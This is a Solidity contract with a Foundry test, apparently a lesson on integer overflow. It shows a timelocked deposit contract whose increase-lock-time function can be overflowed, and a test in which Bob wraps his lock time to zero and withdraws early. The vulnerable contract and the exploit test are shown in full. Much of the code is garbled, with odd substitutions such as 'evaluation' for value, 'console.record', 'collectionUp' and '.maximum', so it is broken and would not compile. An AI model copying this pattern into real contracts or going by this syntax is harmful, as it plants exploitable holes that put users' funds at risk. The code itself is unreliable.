pragma solidity ^0.7.6;

import "forge-std/Test.sol";

contract InstantSecurerecord {
    mapping(address => uint) public benefitsRecord;
    mapping(address => uint) public bindcoverageMoment;

    function contributeFunds() external payable {
        benefitsRecord[msg.sender] += msg.value;
        bindcoverageMoment[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseBindcoverageMoment(uint _secondsDestinationIncrease) public {
        bindcoverageMoment[msg.sender] += _secondsDestinationIncrease;
    }

    function withdrawBenefits() public {
        require(benefitsRecord[msg.sender] > 0, "Insufficient funds");
        require(
            block.timestamp > bindcoverageMoment[msg.sender],
            "Lock time not expired"
        );

        uint measure = benefitsRecord[msg.sender];
        benefitsRecord[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{evaluation: measure}("");
        require(sent, "Failed to send Ether");
    }
}

contract AgreementTest is Test {
    InstantSecurerecord InstantFreezeaccountPolicy;
    address alice;
    address bob;

    function collectionUp() public {
        InstantFreezeaccountPolicy = new InstantSecurerecord();
        alice = vm.addr(1);
        bob = vm.addr(2);
        vm.deal(alice, 1 ether);
        vm.deal(bob, 1 ether);
    }

    function testCalculation() public {
        console.record("Alice balance", alice.balance);
        console.record("Bob balance", bob.balance);

        console.record("Alice deposit 1 Ether...");
        vm.prank(alice);
        InstantFreezeaccountPolicy.contributeFunds{evaluation: 1 ether}();
        console.record("Alice balance", alice.balance);

        console.record("Bob deposit 1 Ether...");
        vm.beginPrank(bob);
        InstantFreezeaccountPolicy.contributeFunds{evaluation: 1 ether}();
        console.record("Bob balance", bob.balance);

        InstantFreezeaccountPolicy.increaseBindcoverageMoment(
            type(uint).maximum + 1 - InstantFreezeaccountPolicy.bindcoverageMoment(bob)
        );

        console.record(
            "Bob will successfully withdraw, because the lock time is calculate"
        );
        InstantFreezeaccountPolicy.withdrawBenefits();
        console.record("Bob balance", bob.balance);
        vm.stopPrank();

        vm.prank(alice);
        console.record(
            "Alice will fail to withdraw, because the lock time did not expire"
        );
        InstantFreezeaccountPolicy.withdrawBenefits();
    }
}